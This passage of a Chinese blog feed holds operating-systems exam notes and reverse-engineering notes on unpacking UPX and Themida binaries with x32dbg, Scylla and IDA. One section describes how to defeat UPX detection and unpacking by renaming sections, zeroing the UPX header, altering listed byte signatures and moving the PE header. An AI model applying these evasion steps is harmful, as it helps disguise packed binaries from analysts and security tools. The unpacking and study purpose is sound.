进程</h3><ul><li><p>引入目的：</p><ul><li>使多个程序并发运行，以改善资源利用率及提高系统的吞吐量</li></ul></li><li><p>定义：</p><ul><li>可并发运行的程序在某个数据集合上的一次运行过程，是操作系统资源分配、保护和调度的基本单位</li></ul></li><li><p>特征：</p><ul><li>结构性、动态性、独立性、并发性</li></ul></li><li><p>进程上下文</p><ul><li>进程的生命周期中，进程实体和支持执行进程的环境合称为进程上下文</li><li>用户级上下文、系统级上下文、寄存器上下文</li></ul></li></ul><h3 id="线程"><a class="markdownIt-Anchor" href="#线程"></a> 线程</h3><ul><li>引入目的：<ul><li>减少程序并发运行时所付出的时空开销</li></ul></li><li>定义：<ul><li>线程是操作系统进程中除处理器外的资源分配和保护的单位，它有一个独立的虚拟地址空间，用来容纳进程映像。</li><li>这是CPU调度的基本单位</li></ul></li></ul><h3 id="pcb"><a class="markdownIt-Anchor" href="#pcb"></a> PCB</h3><ul><li>进程控制块—为了描述和控制进程运行的数据结构<ul><li>记录了描述进程的当前状态以及控制进程运行的信息，主要包括进程标识信息、现场信息和控制信息。</li></ul></li></ul><h3 id="进程调度"><a class="markdownIt-Anchor" href="#进程调度"></a> 进程调度</h3><ul><li>高级调度(作业调度)</li><li>中级调度(平衡调度，内存调度)</li><li>低级调度(进程调度)</li></ul><h3 id="互斥与同步"><a class="markdownIt-Anchor" href="#互斥与同步"></a> 互斥与同步</h3><h4 id="竞争和协作"><a class="markdownIt-Anchor" href="#竞争和协作"></a> 竞争和协作</h4><ul><li>死锁：一组进程都陷入永远等待的状态</li><li>饥饿：被调度程序长期忽视</li><li>协作—同步：一个进程的执行依赖于其协作进程的消息或信号</li><li>竞争—互斥：互斥也是一种特殊的同步——以一定次序协调地使用共享资源</li></ul><h4 id="临界"><a class="markdownIt-Anchor" href="#临界"></a> 临界</h4><ul><li>临界资源：<ul><li>在某段时间内只能允许一个进程使用的资源</li><li>几个进程若共享同一临界资源，它们必须以互斥的方式使用这个临界资源</li></ul></li><li>临界区：<ul><li>进程中访问临界资源的代码段</li></ul></li></ul><h3 id="进程通信"><a class="markdownIt-Anchor" href="#进程通信"></a> 进程通信</h3><ul><li>消息传递通信<ul><li>直接通信</li><li>间接通信</li></ul></li><li>共享内存通信<ul><li>基于共享数据结构的通信方式—低效</li><li>基于共享存储区的通信方式—建立，管理，映射与断开</li></ul></li><li>管道通信<ul><li>实质为一个共享文件，物理上是由文件系统的高速缓冲区完成</li></ul></li></ul><h2 id="考试要点"><a class="markdownIt-Anchor" href="#考试要点"></a> 考试要点</h2><ol><li>信号量机制解决进程同步互斥问题：信号量(记录性数据结构)及其取值范围，P、V操作及含义，P、V操作解决同步互斥问题的方法流程  P45</li><li>调度算法：<code>非抢占式</code>(FCFS、SJF、HRRF)，<code>抢占式</code>(SRTF、HPF、RR、MFQ)，作业或者进程的执行顺序，计算周转时间及带权周转时间  P 58</li><li>死锁的避免：银行家算法及安全性测试算法  P67</li></ol><h3 id="信号量机制"><a class="markdownIt-Anchor" href="#信号量机制"></a> 信号量机制</h3><h4 id="含义"><a class="markdownIt-Anchor" href="#含义"></a> 含义</h4><ul><li><p>信号量s — 信号量表示系统资源的实体</p><ul><li>记录型数据结构，一个分量为信号量的值，一个分量是在信号量关联资源上阻塞的进程队列的队头指针。</li><li>三种操作进行修改：赋初值，P操作，V操作。</li><li>主要作用是封锁临界区、 进程同步和维护资源计数</li></ul></li><li><p>P、V操作— <strong>书P45</strong></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202305052356101.png" alt="image-20230505235624964" /></p><ul><li><p>P(s)：将信号量s减1……</p></li><li><p>V(s)：将信号量s加1……</p></li><li><p>补充定义— <strong>书P46</strong></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202305052356855.png" alt="image-20230505235642802" /></p></li></ul></li></ul><h4 id="方法流程"><a class="markdownIt-Anchor" href="#方法流程"></a> 方法流程</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304301031289.png" alt="image-20230430103109210" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304301037878.png" alt="image-20230430103735854" /></p><ul><li>经典问题<ul><li>生产者-消费者问题</li><li>多生产者-多消费者问题</li><li>读者-写者问题</li><li>哲学家就餐问题</li><li>睡眠理发师问题</li></ul></li></ul><h3 id="调度算法"><a class="markdownIt-Anchor" href="#调度算法"></a> 调度算法</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304301124647.png" alt="image-20230430112422583" /></p><ul><li>周转时间和带权周转时间越小越好</li></ul><h4 id="非抢占式"><a class="markdownIt-Anchor" href="#非抢占式"></a> 非抢占式</h4><h5 id="fcfs"><a class="markdownIt-Anchor" href="#fcfs"></a> FCFS</h5><ul><li>先来先服务(First-Come First-Served)</li></ul><h5 id="sjf"><a class="markdownIt-Anchor" href="#sjf"></a> SJF</h5><ul><li>短作业优先(Shortest-Job-First)</li></ul><h5 id="hrrf"><a class="markdownIt-Anchor" href="#hrrf"></a> HRRF</h5><ul><li>高响应比优先(Highest Response Ratio First)</li><li>响应比 = 1 + (已等待时间 / 估计运行时间)</li></ul><h4 id="抢占式"><a class="markdownIt-Anchor" href="#抢占式"></a> 抢占式</h4><h5 id="srtf"><a class="markdownIt-Anchor" href="#srtf"></a> SRTF</h5><ul><li>最短剩余时间优先(Shortest Remaining Time First)</li></ul><h5 id="hpf"><a class="markdownIt-Anchor" href="#hpf"></a> HPF</h5><ul><li>优先权(Highest-Priority-First)</li><li>静态优先权和动态优先权</li></ul><h5 id="rr"><a class="markdownIt-Anchor" href="#rr"></a> RR</h5><ul><li>时间片轮转(Round-Ribon)</li></ul><h5 id="mfo"><a class="markdownIt-Anchor" href="#mfo"></a> MFO</h5><ul><li>多级反馈队列(Multilevel-Feed-Queue)</li></ul><h3 id="死锁"><a class="markdownIt-Anchor" href="#死锁"></a> 死锁</h3><h4 id="原因"><a class="markdownIt-Anchor" href="#原因"></a> 原因</h4><ul><li>并发进程对临界资源的竞争 和 并发进程推进顺序不当</li></ul><h4 id="发生的必要条件"><a class="markdownIt-Anchor" href="#发生的必要条件"></a> 发生的必要条件</h4><ul><li>互斥条件：资源的使用互斥的</li><li>请求与保持条件：一个进程得到资源并再请求资源时，若请求的资源不能得到，已得到的资源也不会释放</li><li>不剥夺条件：当进程得到资源后，只能由其自身主动释放，系统或其他进程正在占用的资源，形成永远等待</li><li>环路等待条件：系统中若干进程形成环路，每个进程都在等待相邻进程正在占用的资源，形成永远等待</li></ul><h4 id="检测与解除"><a class="markdownIt-Anchor" href="#检测与解除"></a> 检测与解除</h4><ul><li>重启，撤销，剥夺，回滚</li></ul><h4 id="死锁的避免"><a class="markdownIt-Anchor" href="#死锁的避免"></a> 死锁的避免</h4><ul><li>银行家算法<ul><li>Claim Possession Shortage Available</li></ul></li></ul><h1 id="内存管理"><a class="markdownIt-Anchor" href="#内存管理"></a> 内存管理</h1><h2 id="问题相关-3"><a class="markdownIt-Anchor" href="#问题相关-3"></a> 问题相关</h2><ul><li><p>内存管理四大功能  P96</p></li><li><p>地址的表示(逻辑地址空间、物理地址空间)  P98</p></li><li><p>重定位，静态重定位，动态重定位  P99</p></li><li><p>单一连续内存管理、固定分区管理、可变分区管理：  P102</p><p>内存的分配与回收，地址转换，优缺点分析，可变分区的内存分配算法</p></li><li><p>程序的局部性原理，虚拟存储的基本思想，虚拟存储器  P119</p></li><li><p>页式存储管理与请求页式管理的区别与联系？两种管理方式下页表机制和地址转换过程有何不同？</p></li><li><p>请求页式虚拟存储管理的页面分配策略、页面调入策略、页面置换策略  P124</p></li><li><p>段式管理的基本思想，其与页式管理有何区别，段式与段页式、请求段式管理、请求段页式管理的区别与联系</p></li><li><p>各种内存管理方式中的”碎片“问题如何解决</p></li></ul><h3 id="功能"><a class="markdownIt-Anchor" href="#功能"></a> 功能</h3><ul><li>内存的分配和回收</li><li>实现地址转换</li><li>内存的共享和保护</li><li>内存扩充</li></ul><h3 id="地址重定位"><a class="markdownIt-Anchor" href="#地址重定位"></a> 地址重定位</h3><ul><li>地址转换(地址重定位)：把程序和数据的逻辑地址转换为物理地址</li><li>静态重定位：<ul><li>在用户作业装入内存时由装入程序实现从逻辑地址到物理地址的转换，地址转换在作业执行前一次完成</li><li>缺点：必须为程序分配一段连续的存储空间</li></ul></li><li>动态重定位：<ul><li>在程序执行过程中，CPU在访问程序和数据之前才实现从逻辑地址到物理地址的转换</li><li>优点：内存的使用更加灵活，容易实现内存的动态扩充和共享</li></ul></li></ul><h3 id="覆盖和交换"><a class="markdownIt-Anchor" href="#覆盖和交换"></a> 覆盖和交换</h3><ul><li>覆盖技术<ul><li>让不同时运行的程序段先后共享同一块内存区域</li></ul></li><li>交换技术<ul><li>内存和外存的交换</li></ul></li></ul><h3 id="程序的局部性原理"><a class="markdownIt-Anchor" href="#程序的局部性原理"></a> 程序的局部性原理</h3><ul><li>时间局部性：<ul><li>程序中的某条指令一旦被执行，则不久之后该指令可能再次被执行；如果某数据被访问，则不久之后该数据可能再次被访问</li></ul></li><li>空间局部性：<ul><li>一旦程序访问了某个存储单元，则不久之后其附近的存储单元也将被访问</li></ul></li></ul><h3 id="虚拟存储器"><a class="markdownIt-Anchor" href="#虚拟存储器"></a> 虚拟存储器</h3><ul><li>定义：<ul><li>具有请求调入功能和置换功能，能够从逻辑上对内存空间进行扩展，允许用户的逻辑地址空间大于物理内存地址空间的存储器系统</li></ul></li></ul><h2 id="考试要点-2"><a class="markdownIt-Anchor" href="#考试要点-2"></a> 考试要点</h2><ol><li>地址转换：页式管理和请求页式虚拟存储管理中的逻辑地址转化为物理地址(页号、页内偏移量以及所占位数)，快表的地址转换过程，多级页表的地址转换过程</li><li>页面置换：置换算法(FIFO、OPT、LRU、Clock)，算法流程、缺页次数及缺页率计算—添加(前几次也是缺页，但是不统计)</li></ol><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202305061034871.png" alt="image-20230506103405823" /></p><h1 id="设备管理"><a class="markdownIt-Anchor" href="#设备管理"></a> 设备管理</h1><h2 id="问题相关-4"><a class="markdownIt-Anchor" href="#问题相关-4"></a> 问题相关</h2><ul><li>设备的不同分类方法  P151</li><li>设备管理四大功能  P153</li><li>设备控制方法(四种)，工作原理以及优缺点分析  P154</li><li>缓冲技术的作用、不同缓冲技术的工作机制  P159</li><li>输入输出软件的层次及相应的功能  P163</li><li>设备分配与回收时使用的数据结构、设备分配策略  P166</li><li>SPOOLing技术的功能和基本思想，如何实现共享打印机  P168</li></ul><h3 id="设备分类"><a class="markdownIt-Anchor" href="#设备分类"></a> 设备分类</h3><ul><li>按服务功能分类<ul><li>存储类设备</li><li>输入/输出类设备</li><li>通信类设备</li></ul></li><li>按每次信息交换的单位分类<ul><li>字符设备</li><li>块设备</li></ul></li><li>按使用特征分类(这里注意SPOOLing技术的特点)<ul><li>独占设备</li><li>共享设备</li><li>虚拟设备</li></ul></li></ul><h3 id="设备管理功能"><a class="markdownIt-Anchor" href="#设备管理功能"></a> 设备管理功能</h3><ul><li>设备的分配与回收</li><li>缓冲区管理</li><li>设备控制和中断处理</li><li>实现虚拟设备</li></ul><h3 id="设备控制方法"><a class="markdownIt-Anchor" href="#设备控制方法"></a> 设备控制方法</h3><p>​输入输出控制在计算机处理中具有重要的地位，随着计算机结构和软硬件技术的发展，产生了不同的控制方法。按照 I/O 控制器与 CPU 之间联系方式的不同，可把 I/O 设备的控制方式分为四类</p><ul><li>查询方式 - 程序循环查询方式<ul><li><strong>优点</strong>：控制简单</li><li><strong>缺点</strong>：但是 CPU 极大浪费</li></ul></li><li>中断方式 - 中断驱动方式<ul><li><strong>优点</strong>：消除了设备驱动程序不断地轮询<strong>控制器</strong>和<strong>状态寄存器</strong>的开销，提高 CPU 的利用率，提高整个系统资源的利用率及吞吐量</li></ul></li><li>DMA方式 - 直接内存访问方式<ul><li><strong>本质</strong>：通过 DMA控制器DMAC 控制从内存向设备输入输出</li><li><strong>特点</strong>：<ol><li>数据传输的基本单位是<strong>数据块</strong>，即每次传送至少一个数据块。</li><li>所传送的数据是从设备直接送入内存，或者直接读出内存的</li><li>在传输时CPU参与更少，仅在传送一个或多个数据块的开始和结束时，才需CPU干预，整块数据的传送是在控制器的控制下完成的</li></ol></li><li><strong>优点</strong>：进一步提高了 CPU 与 I/O 设备的并行操作程度</li></ul></li><li>通道方式<ul><li><strong>通道分类</strong>：字节多路通道，选择通道，成组多路通道</li><li><strong>优点</strong>：进一步减少 CPU 的干预</li></ul></li></ul><p>​主要差别在于中央处理器和外围设备并行工作的方式不同，并行工作的程度不同。</p><h3 id="缓冲技术"><a class="markdownIt-Anchor" href="#缓冲技术"></a> 缓冲技术</h3><ul><li><p>作用</p><ul><li>它能改善中央处理器与外围设备之间速度不匹配的矛盾，提高 CPU 和I/O 设备的并行性。</li><li>它能减少 I/O 对 CPU 的中断次数和放宽对 CPU 中断响应时间的要求。</li><li>缓冲技术还能协调逻辑记录大小与物理记录大小不一致的问题。</li></ul></li><li><p>分类</p><ul><li>根据缓冲性质<ul><li>硬件缓冲：以专用的寄存器作为缓冲器</li><li>软件缓冲：在内存中划出若干个单元作为缓冲区</li></ul></li><li>根据缓冲区个数的多少和结构<ul><li>单缓冲<ul><li>输入和输出实际上是串行工作</li></ul></li><li>双缓冲<ul><li>两个缓冲区交替使用</li></ul></li><li>多缓冲<ul><li>循环缓冲</li><li>缓冲池</li></ul></li></ul></li></ul></li></ul><h3 id="输入输出软件"><a class="markdownIt-Anchor" href="#输入输出软件"></a> 输入输出软件</h3><ul><li>层次结构(自底向上)<ul><li>中断处理程序</li><li>设备驱动程序</li><li>设备独立性程序</li><li>用户 I/O 软件</li></ul></li></ul><h3 id="设备分配与回收"><a class="markdownIt-Anchor" href="#设备分配与回收"></a> 设备分配与回收</h3><ul><li>设备分配策略—由设备本身属性分类而来<ul><li>独占方式</li><li>共享方式</li><li>虚拟方式</li></ul></li><li>SPOOLing 技术<ul><li>重点：<ul><li>在多道程序技术中，利用其中一道程序模拟脱机输入输出时的外围控制机功能，实现脱机输入输出技术</li><li>外围操作与CPU对数据的处理同时进行，这种在联机情况下实现的同时外围操作称为SPOOLing，或称为假脱机系统</li></ul></li><li><strong>特点</strong>：<ol><li>提高了I/O的速度，缓和了高速的处理器与低速输入输出设备之间的矛盾</li><li>将独占设备改造为共享设备，提高了设备的利用率</li><li>实现了虚拟设备功能，将物理的单个设备变换为多个对应的逻辑设备</li></ol></li><li>应用：<ul><li>共享打印机—守护进程和SPOOLing目录<ul><li>通过禁止用户直接使用打印机设备解决了打印机的独占问题</li></ul></li></ul></li></ul></li></ul><h1 id="文件系统"><a class="markdownIt-Anchor" href="#文件系统"></a> 文件系统</h1><h2 id="考试要点-3"><a class="markdownIt-Anchor" href="#考试要点-3"></a> 考试要点</h2><ol><li>文件的物理结构：根据文件的物理组织情况，计算所支持文件的大小；对于一个给定大小的文件，计算其占用物理盘块情况</li></ol><h2 id="问题相关-5"><a class="markdownIt-Anchor" href="#问题相关-5"></a> 问题相关</h2><ul><li>文件系统基本功能  P199</li><li>文件的逻辑结构和物理结构定义及分类  P201</li><li>记录式文件的组织方式有哪些，各有什么特点  P204</li><li>文件的存储方法、文件存储空间的分配及管理  P213</li><li>文件目录和目录文件的区别与联系    P217</li><li>目录的结构与检索  P217</li><li>文件系统调用的实现  P225</li><li>文件的共享  P230</li></ul><h3 id="基本功能"><a class="markdownIt-Anchor" href="#基本功能"></a> 基本功能</h3><ol><li>实现文件的“按名存取”功能</li><li>实现能够快速定位文件的目录结构；考虑如何组织目录文件</li><li>向用户提供一套使用方便、简单的操作命令</li><li>管理磁盘、磁带等组成的文件存储器</li><li>…………</li></ol><h3 id="文件分类"><a class="markdownIt-Anchor" href="#文件分类"></a> 文件分类</h3><ul><li>按照<strong>文件的逻辑结构</strong>的不同(对比文件<strong>按照外存物理块分配方式的不同</strong>分类—物理结构)<ul><li>流式文件(无结构)</li><li>纪录式文件(有结构)</li></ul></li><li>按照用途<ul><li>系统文件、库文件和用户文件</li></ul></li><li>按照性质<ul><li>普通文件</li><li>目录文件</li><li>特殊文件</li></ul></li></ul><h3 id="纪录式文件"><a class="markdownIt-Anchor" href="#纪录式文件"></a> 纪录式文件</h3><p>有结构的文件</p><h4 id="组织方式分类"><a class="markdownIt-Anchor" href="#组织方式分类"></a> 组织方式分类</h4><ul><li>顺序文件<ul><li>记录之间按某种顺序排列组织所形成的文件</li><li>存取方式：<ul><li>顺序存取</li><li>直接存取</li></ul></li><li><strong>优点</strong>：<ul><li>适合大量记录批量存取的场合</li><li>只有顺序文件才能被存储在磁带上</li></ul></li><li><strong>缺点</strong>：<ul><li>不适合交互系统中用户要求查找或修改单个记录的情况</li><li>增删记录比较困难</li></ul></li></ul></li><li>索引文件<ul><li>索引文件可以根据不同的关键字建立索引，形成包含多个索引表的索引文件</li><li><strong>优点</strong>：<ul><li>通过建立索引极大地提高了对文件的查找速度</li><li>对增加和删除记录也非常方便</li></ul></li><li><strong>缺点</strong>：存储开销变大，增删记录时还需要修改索引表</li></ul></li><li>索引顺序文件<ul><li>将顺序文件中的多个记录组合成一组，并对每一组记录建立一个索引，通过索引指针指向该记录组中的第一条记录</li><li><strong>优点</strong>：索引表占用空间小，同时查找效率比顺序文件又高，因此在文件记录比较多时采用索引顺序文件比较适合</li></ul></li></ul><h3 id="文件的物理结构"><a class="markdownIt-Anchor" href="#文件的物理结构"></a> 文件的物理结构</h3><p>​文件的物理结构不仅取决于存储介质的存储特性，还与采用的外存分配方式有关</p><ul><li>按照外存物理块分配方式的不同，文件的物理结构分类<ul><li>连续文件<ul><li><strong>优点</strong>：在顺序存取时速度较快，非常便于顺序访问</li></ul></li><li>链接文件<ul><li><strong>优点</strong>：<ul><li>能适应文件的动态增长</li><li>消除了磁盘的外部碎片</li><li>添加、删除和修改记录也更方便</li></ul></li><li>实现链接组织的方式<ul><li>隐式链接：每个物理块自身存放下一物理块的链接指针</li><li>显示链接：把用于链接文件的各物理块指针显式地放在内存 的一张表格中</li></ul></li></ul></li><li>索引文件<ul><li>索引表的索引形式<ul><li>无键索引表—适用于流式文件</li><li>有键索引表—适用于纪录式文件</li></ul></li><li><strong>优点</strong>:<ul><li>实现了离散分配</li><li>有利于直接存取</li></ul></li><li><strong>缺点</strong>：<ul><li>索引表增加了空间开销</li><li>索引表的查找增加了时间开销</li><li>不适合中小型文件，对于中小型文件会有空间的浪费</li></ul></li></ul></li><li>多级索引文件<ul><li>Unix中混合了四种寻址方式：直接寻址、一级索引寻址、二级索引寻址和三级索引寻址</li><li>解决以及索引文件存在的索引表过大占用物理块过多的问题</li></ul></li><li>直接文件<ul><li>利用哈希函数直接建立逻辑记录的关键字与其物理地址的对应关系的文件组织形式</li><li><strong>优点</strong>：<ul><li>记录在介质上不需要按序存放，因为它能根据关键字直接计算出物理地址，所以最适合直接存取</li><li>相对于索引文件，它不需索引，节省了索引存储空间和索引查找时间</li></ul></li></ul></li></ul></li></ul><h3 id="文件的存取方式"><a class="markdownIt-Anchor" href="#文件的存取方式"></a> 文件的存取方式</h3><ul><li>顺序存取</li><li>直接存取</li><li>按键存取</li></ul><h3 id="文件存储空间管理"><a class="markdownIt-Anchor" href="#文件存储空间管理"></a> 文件存储空间管理</h3><ul><li>磁盘空间的分配</li><li>磁盘空闲空间的有效管理<ul><li>空闲区表法</li><li>空闲块链表法</li><li>位示图法</li></ul></li></ul><h3 id="文件目录"><a class="markdownIt-Anchor" href="#文件目录"></a> 文件目录</h3><ul><li>任务<ul><li>对大量文件实施有效的管理</li><li>实现“按名存取”</li><li>提高对目录的检索速度</li><li>支持文件共享和文件重名</li></ul></li><li>FCB–用于描述和控制文件的数据结构<ul><li>有关文件存取控制的信息</li><li>有关文件结构的信息</li><li>有关文件使用的信息</li><li>有关文件管理的信息</li></ul></li><li>区别<ul><li>文件目录是文件控制块的有序集合，即一个文件控制块就是一个文件目录项。</li><li>文件目录以文件的形式保存在外存上的，这就形成了目录文件。</li></ul></li></ul><h3 id="文件的共享"><a class="markdownIt-Anchor" href="#文件的共享"></a> 文件的共享</h3><ul><li>静态共享<ul><li>硬链接<ul><li>基于索引节点的链接静态共享</li></ul></li><li>软连接<ul><li>符号链接静态共享</li></ul></li></ul></li><li>动态共享</li></ul>]]></content>
    
    
    <categories>
      
      <category>课程复习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>壳相关</title>
    <link href="/posts/6d13a265.html"/>
    <url>/posts/6d13a265.html</url>
    
    <content type="html"><![CDATA[<p><a href="https://ctf-wiki.org/reverse/windows/unpack/packer-introduction/">壳的介绍及脱壳技巧</a></p><h1 id="脱壳"><a class="markdownIt-Anchor" href="#脱壳"></a> 脱壳</h1><blockquote><p>以ESP定理为例</p></blockquote><ul><li><p>使用x32dbg脱壳时，一开始可能是 <code>jmp</code></p><ol><li><p><code>pushad</code> 可以在断点中找到，因为它是一次性断点，所以出现一次就过去了，可以在断点中找到，然后 <code>F4</code> 跳转</p></li><li><p>一直使用 <code>F9</code> 跳转可以找到 <code>pushad</code></p></li></ol></li><li><p>使用 <code>ESP定理</code> (在pushad之后ESP指向的内存中下硬件断点，之后 <code>F9</code> 跳转) 脱壳时，<code>popad</code> 后面跟着的可能不是主程序入口，这个时候需要查看上下文。一般情况下，<code>popad</code> 之后有一个大跳 (<code>jmp</code>)，跳转后 dump 即可</p><ol><li><code>jmp</code> 之后是 <code>call 函数</code> ，此为 VS 编译 OEP 的特征</li></ol></li><li><p>找到 <code>OEP</code> 之后，使用插件 <code>Scylla</code> 进行 <code>IAT Autosearch</code> 并 <code>Get Imports</code>，之后使用 dump 转储，得到 <code>dump.exe</code> 文件 (此文件可能不能运行，因为没有修复重定位表IAT)</p></li><li><p>然后依然在此插件中 (dbg不要关闭，否则定位不到OEP) 修复重定位表。点击 <code>Fix Dump</code>，得到的 <code>_SCY.exe</code> 文件即为可执行文件</p></li></ul><p>参考地址：<a href="https://www.52pojie.cn/thread-1534675-1-1.html">upx脱壳</a>，<a href="https://blog.csdn.net/weixin_46287316/article/details/109669066#">xdbg手动脱壳</a></p><h1 id="upx"><a class="markdownIt-Anchor" href="#upx"></a> UPX</h1><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><h2 id="去除-upx-特征"><a class="markdownIt-Anchor" href="#去除-upx-特征"></a> 去除 UPX 特征</h2><h3 id="区段名"><a class="markdownIt-Anchor" href="#区段名"></a> 区段名</h3><p>​<code>IMAGE_SECTION_HEADER SectionHeader</code> 字段</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304012357341.png" alt="image-20230401235746301" /></p><ul><li>upx 壳可以看到三个区段名<ul><li><code>UPX0</code> 和 <code>UPX1</code> 是加 UPX 壳后的两个区段名，<strong>可以被随意改成任何字符串</strong>，这样不会被 <code>./upx.exe -d [filename]</code> 识别<ul><li><code>UPX1</code> 区段包含了需要解压的数据块。</li></ul></li><li><code>UPX2</code> 是自身不含资源段程序加壳之后的结果，若是程序含有资源段，那么加壳之后是<code>.rsrc</code><ul><li><code>.rsrc</code> 是程序资源信息区段名，包含原资源段的完整头部、图标、Mainifst、版本等未被压缩的资源，还有UPX本身需要导入的信息等。</li></ul></li></ul></li></ul><h3 id="upx-header-字段"><a class="markdownIt-Anchor" href="#upx-header-字段"></a> <code>UPX Header</code> 字段</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304020917186.png" alt="image-20230402091703153" /></p><ul><li><code>3E 2E 30 32 00</code>- 版本</li><li><code>55 50 58 21</code> - UPX Tag</li><li><code>0D 09 08 07</code> - 版本代码、格式、压缩方式、压缩等级</li><li><code>0A 88 3F EF 02 D1 CF F7</code> - 压缩前和压缩后的hash</li><li><code>80 4A 0E 00</code> - 压缩前的长度</li><li><code>D5 40 04 00</code> - 压缩后的长度</li><li><code>81 B1 15 00</code> - 原文件长度</li><li><code>26 18 00 1C</code> - 压缩相关参数</li><li>UPX头是供 UPX 通过 <code>upx - d</code> 命令脱壳使用的，并不影响程序运行。全部抹零，则命令无效。</li></ul><h3 id="特征码"><a class="markdownIt-Anchor" href="#特征码"></a> 特征码</h3><ul><li>除了上面两个方面之外，exeinfo之类查壳程序还能识别出 UPX 壳，这是因为检测UPX是通过一些特征码来检测的。在 UPX 解压缩时，必然会使用一些汇编指令，这些指令的机器码就成为了用来检测 UPX 的特征码。修改特征码，达到保持汇编指令的含义不变，而使用别的指令。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">1. 特征码1:60 BE ?? ?? ?? 00 8D BE ?? ?? ?? FF<br><br>2. 特征码2:60 BE ?? ?? ?? ?? 8D BE ?? ?? ?? ?? 57 EB 0B 90 8A 06 46 88 07 47 01 DB 75 ?? 8B 1E 83 ?? ?? 11 DB 72 ?? B8 01 00 00 00 01 DB 75<br><br>3. 特征码3:55 FF 96 ?? ?? ?? ?? 09 C0 74 07 89 03 83 C3 04 EB ?? FF 96 ?? ?? ?? ?? 8B AE ?? ?? ?? ?? 8D BE 00 F0 FF FF BB 00 10 00 00 50 54 6A 04 53 57 FF D5 8D 87 ?? ?? 00 00 80 20 7F 80 60 28 7F 58 50 54 50 53 57 FF D5 58 61 8D 44 24 80 6A 00 39 C4 75 FA 83 EC 80<br></code></pre></td></tr></table></figure><ul><li>特征码1 / 特征码2</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304021005714.png" alt="image-20230402100545695" /></p><p>​特征码2也是 pushad 开头，是另外一种特征，这里没有显示</p><ul><li>特征码3</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304021014712.png" alt="image-20230402101429691" /></p><p>​特征码3 匹配到 popad 结尾</p><p>这里借鉴<a href="https://www.52pojie.cn/thread-326995-1-1.html">UPX防脱壳机脱壳、去除特征码、添加花指令小探 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><h3 id="移动pe头"><a class="markdownIt-Anchor" href="#移动pe头"></a> 移动PE头</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304020944416.png" alt="image-20230402094451392" /></p><ul><li>删除DOS存根，不影响程序运行，但是需要修改 PE入口地址，并且保证PE头的长度等于原来的DOS头加PE头的长度，不然之后的地址会出现问题。</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304020958802.png" alt="image-20230402095850765" /></p><ul><li>这里 DOS存根的大小是 0x40(x86文件)，删去之后修改 <code>PE头地址</code> 和 <code>可选PE头的大小</code>，之后<code>填充无用数据</code>(0x40大小) 使地址偏移不发生改变</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304021001269.png" alt="image-20230402100153227" /></p><ul><li>之后就识别不出来是 UPX 头了。(x86移动个PE头就识别不到了，x64的只移动PE头则不行)</li></ul><h1 id="themida"><a class="markdownIt-Anchor" href="#themida"></a> Themida</h1><ul><li>可以直接使用 <a href="https://github.com/ergrelet/unlicense">unlicense</a> 直接进行脱壳处理。运行几分钟之后会出现一个<code>unpacked_&lt;程序名&gt;.exe</code> 的文件</li><li>题目：<code>HZNUCTF TMD</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>逆向笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>逆向技巧</title>
    <link href="/posts/5d944f2a.html"/>
    <url>/posts/5d944f2a.html</url>
    
    <content type="html"><![CDATA[<h1 id="ida-pro"><a class="markdownIt-Anchor" href="#ida-pro"></a> IDA PRO</h1><p><a href="https://www.hex-rays.com/products/ida/support/freefiles/IDA_Pro_Shortcuts.pdf">快捷方式</a></p><h2 id="设置"><a class="markdownIt-Anchor" href="#设置"></a> 设置</h2><h3 id="graph-is-too-big"><a class="markdownIt-Anchor" href="#graph-is-too-big"></a> Graph is too big</h3><ul><li><p>显示错误</p></li><li><p>解决:更改<code>Options----Graph----Max number of nodes</code>,增大参数</p></li></ul><h3 id="graph界面显示地址"><a class="markdownIt-Anchor" href="#graph界面显示地址"></a> Graph界面显示地址</h3><ul><li><p>Graph界面无地址显示</p></li><li><p>更改<code>Options----Disassembly----Line prefixes(non-graph)(勾选)</code></p></li></ul><h3 id="窗口设置"><a class="markdownIt-Anchor" href="#窗口设置"></a> 窗口设置</h3><ul><li>设置汇编窗口和伪代码窗口关联-<code>synchronize with -&gt; IDA View-A Hex View-1</code></li></ul><h3 id="idapython"><a class="markdownIt-Anchor" href="#idapython"></a> IDAPython</h3><ol><li>在 <code>&quot;IDA\python\3&quot;</code> 目录下添加 <code>idc_bc695.py</code> 文件</li><li>之后在IDAPython脚本中手动添加 <code>from idc_bc695 import *</code> 防止api差异</li></ol><h2 id="静态调试"><a class="markdownIt-Anchor" href="#静态调试"></a> 静态调试</h2><h3 id="快捷方式"><a class="markdownIt-Anchor" href="#快捷方式"></a> 快捷方式</h3><ol><li><code>ctrl + e</code> 找到main函数</li><li><code>Shift + f12</code> 可以打开 string 窗口，一键找出所有的字符串，右击setup，对窗口的属性进行设置。同时附加时使用可以显示 strings</li><li><code>Shift + f7</code> 可以查看 Segments 窗口。查看不同的段</li><li><code>空格</code> 在Text View和Group View中来回切换</li><li><code>f5/Tab</code> 一键反汇编，Tab可以在汇编界面与伪代码界面来回切换</li><li><code>Ctrl + X</code> 交叉引用</li><li><code>Ctrl + Alt + K</code>(Keypatch快捷键) 进行patch</li><li><code>Alt + T</code> 